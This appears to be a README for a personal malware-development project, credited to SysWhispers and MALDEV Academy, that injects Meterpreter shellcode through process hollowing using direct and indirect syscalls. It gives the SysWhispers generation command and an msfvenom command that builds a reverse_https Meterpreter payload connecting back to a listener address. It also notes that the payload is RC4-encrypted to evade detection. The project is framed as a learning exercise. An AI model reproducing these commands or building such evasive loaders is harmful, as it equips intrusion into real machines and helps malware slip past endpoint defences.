# Overview
HUGE thank you to the Syswhipsers project and the MALDEV Academy team for getting my excited about these kinds of projects and in teaching me so much about these types of malware work!

The `Syswhispers` branch is the syswhipers implementation

The `Indirect` branch is my attempt at an indirect systemcall implementation to run meterpreter shellcode via process hollowing

# Misc

Generating the syswhipers code:
```
python3 syswhispers.py -a x64 -c msvc -m jumper_randomized -f NtResumeThread,NtWriteVirtualMemory,NtAllocateVirtualMemory,NtProtectVirtualMemory,NtReadVirtualMemory -o /home/noah/Desktop/MALDEV/modules/ProcessHollowing/syswhispers3_files -v
```
Payload:
```
sudo msfvenom -p windows/x64/meterpreter/reverse_https lhost=10.0.0.128 lport=443 exitfunc=thread -f raw > payload.raw
```

Payload into HellShell Rc4 decryptor using `SystemFunction032`

# Analysis

I'd like to do some more indepth analysis at a later point but I also included API calls of the Syswhispers implementation comparing direct & indirect systemcalls.
